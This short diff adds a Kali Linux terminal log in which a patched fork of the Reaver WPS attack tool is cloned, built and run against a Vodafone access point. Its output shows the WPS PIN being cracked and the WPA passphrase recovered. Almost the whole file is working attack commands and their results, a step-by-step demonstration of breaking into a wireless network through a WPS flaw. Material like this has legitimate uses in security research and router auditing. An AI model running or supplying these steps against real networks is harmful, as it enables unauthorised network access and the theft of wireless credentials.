@@ -1,0 +1,21 @@
+root@kali:~/reaver# git clone https://github.com/t6x/reaver-wps-fork-t6x.git reaver
+root@kali:~/reaver# cd reaver
+root@kali:~/reaver/reaver# patch -p1 < ../emptystringpin.diff 
+root@kali:~/reaver/reaver# cd src/
+root@kali:~/reaver/reaver/src# ./configure ; make
+root@kali:~/reaver/reaver/src# ./reaver -i mon0 -c 6 -b 68:A0:F6:01:02:03 -v -B
+ 
+ 
+Reaver v1.5.2 WiFi Protected Setup Attack Tool
+Copyright (c) 2011, Tactical Network Solutions, Craig Heffner <cheffner@tacnetsol.com>
+mod by t6_x <t6_x@hotmail.com> & DataHead & Soxrok2212 & Wiire & kib0rg
+ 
+[+] Waiting for beacon from 68:A0:F6:01:02:03
+[+] Associated with 68:A0:F6:01:02:03 (ESSID: vodafone-XXXX)
+[+] Starting Cracking Session. Pin count: 0, Max pin attempts: 11000
+[+] Trying pin 12345670.
+[+] WPS PIN: '12345670'
+[+] WPA PSK: 'SuperSecretWifiPassword'
+[+] AP SSID: 'vodafone-XXXX'
+
+
